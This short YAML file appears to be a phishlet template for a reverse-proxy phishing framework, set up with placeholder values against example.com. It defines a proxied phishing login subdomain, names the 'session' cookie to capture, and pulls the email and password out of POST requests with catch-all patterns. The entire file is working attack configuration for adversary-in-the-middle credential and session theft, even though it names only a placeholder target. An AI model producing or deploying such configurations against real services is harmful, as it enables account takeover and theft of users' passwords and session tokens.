name: example
author: test
version: "1.0"
proxy_hosts:
  - phish_sub: login
    orig_sub: login
    domain: example.com
    is_landing: true
auth_tokens:
  - domain: example.com
    keys:
      - name: session
sub_filters: []
credentials:
  username:
    key: email
    search: "(.*)"
    type: post
  password:
    key: password
    search: "(.*)"
    type: post
login:
  domain: login.example.com
  path: /login
